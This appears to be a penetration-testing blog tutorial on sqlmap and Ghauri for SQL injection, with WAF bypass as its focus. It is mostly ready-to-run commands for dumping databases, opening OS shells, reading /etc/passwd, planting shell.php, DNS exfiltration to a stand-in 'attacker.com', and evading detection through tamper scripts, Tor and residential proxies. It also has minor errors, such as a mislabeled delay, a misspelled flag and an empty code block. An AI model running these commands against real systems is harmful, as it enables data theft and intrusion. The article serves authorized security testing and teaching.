---
title: 'Mastering SQLMap and Ghauri: A Practical Guide to WAF Bypass Techniques'
subtitle: Step-by-Step Methods to Identify, Exploit and Bypass WAF Protections
tags:
- Bug Bounty
- Technology
- Programming
- Penetration Testing
- Cybersecurity
published: '2026-01-15'
free: false
freedium_url: https://freedium-mirror.cfd/https://infosecwriteups.com/mastering-sqlmap-and-ghauri-a-practical-guide-to-waf-bypass-techniques-1aaa9eee9d32
source_url: https://infosecwriteups.com/mastering-sqlmap-and-ghauri-a-practical-guide-to-waf-bypass-techniques-1aaa9eee9d32
---

# Mastering SQLMap and Ghauri: A Practical Guide to WAF Bypass Techniques

*Step-by-Step Methods to Identify, Exploit and Bypass WAF Protections*

*Published Jan 15, 2026 · Free: No*

### Introduction

**SQL Injection** (SQLi) remains one of the most impactful web application vulnerabilities even in 2026. While WAFs, ORMs and secure coding frameworks have improved, real-world applications still expose injection points through legacy code, misconfigured APIs and complex backend logic. To handle modern targets and strong defenses, security researchers use some automated tools like **SQLmap** and **Ghauri**. Both aim to automate the full SQLi workflow, from detection to exploitation. but their internal design, performance and evasion strategies differ significantly.

In this article, I'll show how to use both tools in practice, covering advanced enumeration, WAF bypass techniques and automation workflows for modern penetration testing.

> 📝 Note: Before you continue, it's recommended to read the previous article where I covered the best ways to find SQL injection, both manually and with automation. This will help you understand the full process and follow this article more easily.

[**Mastering SQL Injection Recon: Step-by-Step Guide for Bug Bounty Hunters**](https://infosecwriteups.com/mastering-sql-injection-recon-step-by-step-guide-for-bug-bounty-hunters-9f493fb058dd)
*A practical guide to uncovering SQL injection flaws using automation, payloads and deep reconnaissance techniques.*

### SQLmap: The Industry Standard

SQLmap is an open-source tool that automates the detection and exploitation of SQL injection vulnerabilities, from discovery to full database takeover. It is widely regarded as the most powerful tool in its class, trusted by the security researcher and penetration testing community.

#### Key Strengths:

- Extensive DBMS support (MySQL, Oracle, PostgreSQL, MSSQL, etc.).
- Support for all six SQLi techniques: boolean-based blind, error-based, UNION query-based, stacked queries, time-based blind and out-of-band.
- Advanced features like file system access, OS command execution and registry access.
- Highly customizable via **tamper scripts**.

**Note:** You can view all available options and full command usage with the -hh flag. Below are only the most useful and practical ones I rely on in real tests.

#### Essential Command Overview

sqlmap uses a modular command structure. Here are the most common operations:

#### Basic Target Scanning

Performs an initial SQL injection test on a single GET parameter and enumerates available databases.

```css
sqlmap -u "vulnerable_url" --dbs --batch
```

#### Testing via Request File (Best for POST/Headers)

Uses a raw HTTP request captured from Burp or similar tools to test POST bodies, headers, cookies, JSON and complex API requests.

```css
sqlmap -r request.txt --level 5 --risk 3 --batch --dbs
```

#### Using Dorking method

Searches vulnerable URLs directly from search engines and tests them automatically.

```bash
sqlmap -g 'site:target.com inurl:\".php?id=1\"'
```


#### BULK Urls

Scan multiple target URLs listed in a text file in a single automated run, so you do not have to test each target manually one by one.

```go
http://testphp.vulnweb.com/search.php?limit=100
http://testphp.vulnweb.com/search.php?order=order&query=query
http://testphp.vulnweb.com/search?q=aaa
http://testphp.vulnweb.com/showimage.php?file=aa
sqlmap -m urls.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs
```

#### Tor mode

Routes all traffic through the Tor network to hide your real IP and evade IP-based blocking or rate limits.

```go
sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --dbs --batch
```

#### Burp mode

Sends all SQLmap traffic through Burp Suite for inspection, manual tampering and WAF behavior analysis.

```perl
sqlmap -r request.txt --level 3 --risk 2 --random-agent --time-sec=30  --proxy https://127.0.0.1:8080 --thread=10 --dbs --hostname --curent-user --current-db
```

#### JSON-Based SQL Injection

Detects SQL injection in JSON request bodies, use hex-encoded payloads and continues testing even when API gateways return 403 Forbidden responses.

```rust
sqlmap -u 'vulnerable_url' --data '{"User":"admin","Pwd":"admin@123"}' --random-agent --ignore-code 403 --dbs --hex
```

#### Database Enumeration

These options let you systematically explore the database structure, from listing databases to extracting specific tables, columns and data.

```css
--dbs                                      # Lists all available databases on the target.
-D database_name --tables                  # Lists all tables inside the specified database.
-D database_name -T table_name --columns   # Lists all columns inside the specified table.
-D database_name -T table_name -C col1,col2 --dump  # Dumps only the selected columns from the table.
```

#### Advanced Data Extraction

These options help pull large amounts of data efficiently while avoiding common filtering and encoding issues during dumping.

```perl
--dump-all     # Dumps all databases, tables, and data in one go.
--threads=10   # Uses 10 parallel threads to speed up the attack.
--hex          # Encodes retrieved data in hex to bypass filters and avoid encoding issues.
--no-cast      # Disables data type casting to prevent DB conversion errors during extraction.
```

#### Authentication & Session Handling

These options allow sqlmap to work with authenticated sessions, custom headers, and CSRF-protected forms while reducing the chance of detection.

```graphql
--cookie="PHPSESSID=..."               # Sends a session cookie to stay authenticated.
--headers="X-Forwarded-For: 127.0.0.1" # Adds custom HTTP headers (can spoof IP or bypass WAF rules).
--csrf-token=token                     # Handles CSRF-protected forms by extracting and reusing the token.
--random-agent                         # Randomizes User-Agent on each request to avoid detection.
```

#### OS & File System Access

These options show how SQL injection can be used for post-exploitation, allowing file access and in some cases, command execution on the underlying server.

```perl
--os-shell                              # Attempts to open an interactive command shell on the target OS.
--os-pwn                                # Tries full system takeover using advanced exploitation methods.
--file-read=/etc/passwd                 # Reads a file from the target server.
--file-write=shell.php --file-dest=/var/www/html/shell.php  # Uploads a local file to a specific path on the server.
```

#### Out-of-Band & DNS Exfiltration

These options use external channels like DNS or HTTP to confirm and extract data from blind SQL injection when in-band responses are not available.

```bash
--dns-domain=attacker.com   # Uses a custom DNS domain for out-of-band data exfiltration and blind SQLi checks.
--os-shell --technique=O   # Attempts an OS command shell using only Out-of-Band (DNS/HTTP) injection techniques.
```

#### Header Abuse

These options manipulate HTTP headers, methods and parameter formats to bypass proxies, WAF rules or unusual request handling logic.

```ini
--headers="X-Original-URL: /vuln.php"  # Sends a custom header, often used to bypass reverse proxy or WAF routing rules.
--method=PUT                          # Forces the HTTP request method to PUT instead of GET/POST.
--param-del=";"                      # Sets a custom parameter delimiter when the target separates parameters with ';'.
```


#### Time & Rate Evasion

These options slow down requests and reduce noise, helping sqlmap avoid rate limits and behavior-based detection while staying reliable.

```ini
--delay=5     # Waits 3 seconds between each request to stay stealthy.
--timeout=20  # Sets 20 seconds as the max wait time for a server response.
--retries=5   # Retries a failed request up to 5 times.
--threads=1   # Uses a single thread for slow, low-noise scanning.
```

#### SQL Injection in Forms

This method uses sqlmap to automatically find and test form inputs for SQL injection by crawling the page and analyzing all detected fields.

```bash
sqlmap -u https://target.com/registration --dbs --forms --crawl=2 --batch
```

### SQLmap WAF Bypass & Evasion Techniques

Modern WAFs (Cloudflare, Akamai, etc.) analyze request patterns and payload behavior, not just specific keywords. To evade these detections, tamper scripts are used to dynamically modify SQL payloads before they are sent, altering their structure, encoding and syntax to bypass filtering rules.


You can find the usage of all tamper scripts in the table below, which contains complete details of **SQLmap Default Tamper Scripts**, including their requirements, tested environments, notes and example payload injections.

[**payloads/Sqlmap Tamper Scripts cheatSheet.ods at main · coffinxp/payloads**](https://github.com/coffinxp/payloads/blob/main/Sqlmap%20Tamper%20Scripts%20cheatSheet.ods)
*Contribute to coffinxp/payloads development by creating an account on GitHub.*

#### SQLmap Tamper Scripts Official repo:

[**sqlmap/tamper at master · sqlmapproject/sqlmap**](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)
*Automatic SQL injection and database takeover tool - sqlmap/tamper at master · sqlmapproject/sqlmap*

#### Ignore Blocked HTTP Codes

Ignore blocked HTTP status codes. If a WAF returns 403 or 500, configure SQLmap to ignore these codes and continue testing.

```lua
sqlmap -r request.txt --level=5 --risk=3 --no-cast --force-ssl --ignore-code=500 --dbs
```

#### Imperva / Incapsula WAF Bypass

```lua
sqlmap -u 'vulnerable_url' --risk 3 --level 5 --dbs --tamper=space2comment,space2morehash
```

#### ModSecurity WAF Bypass

Use tamper scripts like below with random agents, delays and encoding to break regex patterns and slip payloads past ModSecurity filters.

```lua
proxychains sqlmap -u 'vulnerable_url' --random-agent --batch --dbs --level 3 --tamper=between,space2comment --hex --delay 5
sqlmap -u 'vulnerable_url' --dbs --random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --batch --level 3
```



#### Cloudflare **WAF** Bypass

Evade Cloudflare's signature checks by breaking keyword patterns with random case, encoding, and inline comment tampering.

```lua
sqlmap -u 'vulnerable_url' --batch --dbs --threads=5 --random-agent --risk=3 --level=5 --tamper=space2comment -v 3 --dbms=MySQL
sqlmap -r req.txt --risk 3 --level 3 --dbs --tamper=space2comment,space2morehash
sqlmap -u "vulnerable_url" --tamper=space2comment,randomcase,charencode --level 5 --risk 3 --batch --dbs
```


```bash
proxychains sqlmap -u 'vulnerable_url' --dbs --batch -p id --random-agent --tamper=between,space2comment --dbms mysql --tech=B --no-cast  --flush-session --threads 10
```



> 📝 **Note: Don't use too many tamper scripts at once. It makes payloads very long, triggers WAF blocks, causes conflicts, false positives and slows scans. Use only what's needed and never more than 3 tampers.**

#### Sqlmap WAF Bypass Tips (Works for Me Every Time)

- Use — tamper with one or more scripts (comma-separated) to obfuscate payloads and evade signature-based rules. Popular effective ones include:

```bash
--tamper=between,randomcase,space2comment                 # Effective on: ModSecurity, Cloudflare, F5 ASM
--tamper=space2comment,space2morehash                     # Effective on: ModSecurity, Imperva SecureSphere
--tamper=modsecurityversioned,space2comment               # Effective on: ModSecurity, Comodo WAF
--tamper=space2comment,between,randomcase,charencode      # Effective on: Cloudflare, Akamai, Sucuri
--tamper=space2comment,randomcase,unmagicquotes           # Effective on: PHP WAFs, Wordfence, LiteSpeed
--tamper=space2comment,between,percentage                 # Effective on: Imperva, Barracuda
--tamper=charencode,randomcase,space2comment              # Effective on: Cloudflare, F5 ASM, Radware
--tamper=space2plus,space2comment,randomcase              # Effective on: Akamai, Sucuri, StackPath
--tamper=between,space2comment,modsecurityzeroversioned   # Effective on: ModSecurity, Comodo
--tamper=space2comment,randomcase,apostrophemask          # Effective on: Imperva, Cloudflare
--tamper=charunicodeencode,space2comment,randomcase       # Effective on: Akamai, Radware, Azure WAF
--tamper=space2comment,between,randomcase,bluecoat        # Effective on: BlueCoat / Symantec WAF
--tamper=space2comment,between,randomcase,equaltolike     # Effective on: F5 ASM, Citrix NetScaler
--tamper=space2comment,randomcase,overlongutf8            # Effective on: FortiWeb, Legacy ModSecurity rules
```

- Use — ignore-code=401,403 (or other block codes) so SQLMap doesn't stop when the WAF interferes.
- Use proxychains + residential proxies to rotate IPs and mimic legitimate traffic residential IPs often evade reputation-based WAF blocks far better than datacenter ones.
- Use — dbms mysql (or postgresql, mssql, etc.) when you know or fingerprint the backend DBMS, this forces SQLmap to use engine-specific payloads, making detection harder and results faster/more precise.
- Combine — risk 2 (or — risk 3 only if really needed) with a moderate — level to use stronger payloads when basic ones fail. Try to avoid — risk 3 whenever possible, since it can be more aggressive and may cause instability or unintended impact on the target system.
- Use — hex when dealing with filtering issues or encoding problems, as it forces SQLMap to send data in hexadecimal form, which can help bypass input validation and some WAF rules.
- Use — null-connection to test injection with minimal response data and reduce WAF inspection, and enable keep-alive ( — keep-alive) to reuse the same TCP connection, which can look more like normal browser traffic and help avoid behavior-based blocking.
- Use — no-cast when type casting breaks payloads. It avoids CAST operations and helps when data retrieval is hard or unstable.

### SQLMap AI Assistant

You can also use the new AI-powered SQLmap wrapper, which automates SQL injection detection and exploitation across major database systems.

[**GitHub - atiilla/sqlmap-ai: This script automates SQL injection testing using SQLMap with…**](https://github.com/atiilla/sqlmap-ai)
*This script automates SQL injection testing using SQLMap with AI-powered decision making. - atiilla/sqlmap-ai*

### Ghauri: The Advanced Alternative

While SQLmap is the industry standard, Ghauri is an advanced SQL injection exploitation framework optimized for blind, time-based, and WAF-protected targets. It is particularly effective against modern JavaScript-heavy applications, REST APIs, and cloud WAFs where traditional payload patterns are heavily filtered.

#### Key Strengths:

- Advanced **adaptive** for time-based and boolean-based blind injections.
- Clean, modular architecture optimized for speed.
- Excellent performance against Cloud WAFs (Cloudflare, Akamai).
- Built-in payload obfuscation that mimics human-like behavior.

Its engine is optimized for asynchronous requests and adaptive delay calibration, making it very efficient for stealth exploitation.

#### Essential Ghauri Commands

Ghauri uses commands very similar to SQLmap, so it is easy to switch and start using it quickly.

#### Basic Scan

Always start with a basic scan. Use this simple command first to test a single GET parameter for SQL injection and enumerate available databases.

```css
ghauri -u "vulnerable_url" --dbs --batch
```

#### Testing via Request File (Best for POST/Headers)

Test using a Burp request file for deeper coverage. It lets you scan POST data, cookies, custom headers and API parameters in a single run.

```css
ghauri -r request.txt -p txt_user_id --dbs --batch --level 3
```


#### BULK Urls

Scan multiple target URLs listed in a text file in a single automated run, so you do not have to test each target manually one by one.

```css
ghauri -m urls.txt --batch --dbs --level 3 --threads 10
```

#### JSON & API Targeting

For JSON POST injections, run SQLmap with — data flag using the JSON body. It often works better than using a brup request file.

```rust
ghauri -u 'vulnerable_url' --data '{"User":"test","Pwd":"test@123"}' --random-agent --dbs --level 3 --batch
```

[**GitHub - r0oth3x49/ghauri: An advanced cross-platform tool that automates the process of detecting…**](https://github.com/r0oth3x49/ghauri)
*An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws …*

### Ghauri WAF Bypass & Evasion Techniques

Ghauri smartly adapts its inference techniques and obfuscates payloads to look like normal user traffic, making it easier to slip past WAFs and other security defenses. Below are some commands that consistently help me when dealing with WAF bypass.

```graphql
--prefix "')/**/"   # Adds a custom string before each payload to help break out of the original query context.
--suffix "--+"     # Appends a SQL comment to terminate the rest of the original query safely.
--skip-urlencode  #Skip URL encoding of payload data
--confirm        # Verifies and confirms the injected payloads before proceeding with exploitation
proxychains     # Routes all traffic through a proxy to hide your real IP and evade IP-based blocking or rate limits.
ghauri -u 'vulnerable_url' --batch --dbs --level 3 --dbms mysql --confirm --time-sec 10 --delay 5
```


```lua
ghauri -u 'vulnerable_url' --dbs --batch --level 3 --dbms mysql --tech=T --level 3 --confirm --time-sec 10 --delay 5
```


```css
proxychains ghauri -u "vulnerable_url" -p param --batch --dbs --confirm --level 3 --time-sec 10
```


```lua
ghauri -u 'vulnerable_url' --dbs --level 3 --batch --dbms=mysql --random-agent --confirm
```


#### Fortinet WAF Bypass with junk data

Sends a large amount of 1k junk data to confuse the WAF, so the backend processes the request differently and the payload can slip through.

```kotlin
```


#### WAF Inspection Limits You Can Abuse

These provider-specific body size limits can be abused by sending payloads larger than what the WAF fully inspects, causing SQLi parts to slip past while the backend still processes them.

```markdown
### Documented WAF Request Body Inspection Limits

| WAF Provider           | Maximum Request Body Inspection Size
|------------------------|--------------------------------------
| Cloudflare             | 128 KB (ruleset engine), up to 500 MB (Enterprise)
| AWS WAF                | 8 KB – 64 KB (configurable by service)
| Akamai                 | 8 KB – 128 KB
| Azure WAF              | 128 KB
| FortiWeb (Fortinet)    | 100 MB
| Barracuda WAF          | 64 KB
| Sucuri                 | 10 MB
| Radware AppWall        | Up to 1 GB (Cloud WAF)
| F5 BIG-IP WAAP         | 20 MB (configurable)
| Palo Alto              | 10 MB
| Google Cloud Armor     | 8 KB (can be increased to 128 KB)
```

#### Ghauri WAF Bypass Tips (Works for Me Every Time)

- Use — confirm to re-validate payloads and reduce false positives.
- Use — delay to slow down requests and avoid rate-limit or behavior-based blocking.
- use proxychains with residential IPs for better WAF evasion.
- Increase — level 3 to expand the depth of injection tests.
- If — dbs returns nothing, try — current-user, — current-db, and — hostname to confirm injection.
- Use — ignore-code to skip blocking HTTP responses (for example, 401 or 403).
- Use — dbms when the backend DBMS is known, forces Ghauri to focus on that engine for faster and more precise results.

**Also Ghauri** automatically adapts its timing and extraction logic, helping it evade behavior-based WAFs that block fixed payload patterns.

### Ghauri vs SQLMap: WAF Bypass Showdown

**WAF Bypassed with Ghauri: Using — confirm and Level 3**


**WAF Bypassed with SQLMap: Using Between, RandomCase and Space2Comment**


**WAF Bypassed with SQLMap Using — hex and ProxyChains via Residential Proxies**


Always test with both tools. Sometimes SQLmap finds the injection, other times Ghauri succeeds where SQLmap fails. Relying on just one tool can make you miss real vulnerabilities.

### 💡Tip: Bypassing via Origin IP:

Always try to identify the **Origin IP** first, if possible. Once you have it ( via sources like FOFA or Shodan), replace the domain with the origin IP so your requests are sent directly to the backend instead of passing through the WAF. This helps you assess the application without interference from cloud-based protections. After that, update your hosts file to map the original domain to the discovered origin IP, then run Ghauri against the modified URL to test the application directly.

You can learn different ways to find the origin IP in this article, which will help you in SQL injection testing.

[**How to Find Origin IP of any Website Behind a WAF**](https://infosecwriteups.com/how-to-find-origin-ip-of-any-website-behind-a-waf-c85095156ef7)
*FInd any website origin ip that will help you in WAF Bypass*

### Conclusion

SQLmap is a full-featured SQL injection framework with strong DBMS support and powerful tamper capabilities, making it the gold standard for complete testing. Ghauri focuses on modern WAFs, APIs and blind injection, using adaptive timing and payload mutation for stealthy bypass. Together, they provide strong coverage for both legacy and modern targets.

### Disclaimer

> _The content provided in this article is for educational and informational purposes only. Always ensure you have proper authorization before conducting security assessments. Use this information responsibly._
